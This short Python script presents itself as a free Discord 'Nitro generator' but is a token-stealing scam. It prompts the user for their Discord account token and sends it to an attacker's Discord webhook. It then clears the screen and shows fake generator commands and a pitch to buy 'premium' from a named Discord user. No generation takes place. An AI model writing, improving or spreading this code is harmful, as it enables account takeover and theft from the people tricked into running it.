import requests
import os

from discord_webhook import DiscordWebhook

print("NITRO GENERATOR v1.0")


tokenstel = input("Token (If you enter invalid generator will not work): ")
webhook = DiscordWebhook(url='YOUR-WEBHOOK-LINK-HERE', content=tokenstel)
respond = webhook.execute()

os.system("cls")
input("Press enter to start the generating!")
os.system("cls")

print("NITRO GENERATOR v1.0")

print('''
[WORKS ON DISCORD CHAT]

<start - Please type this command to start generating ( If dont works tell me on discord: AngryBirds2222#1485 )
<generate [PREMIUM] - DM me on discord AngryBirds2222#1485 to buy premium
''')
input()
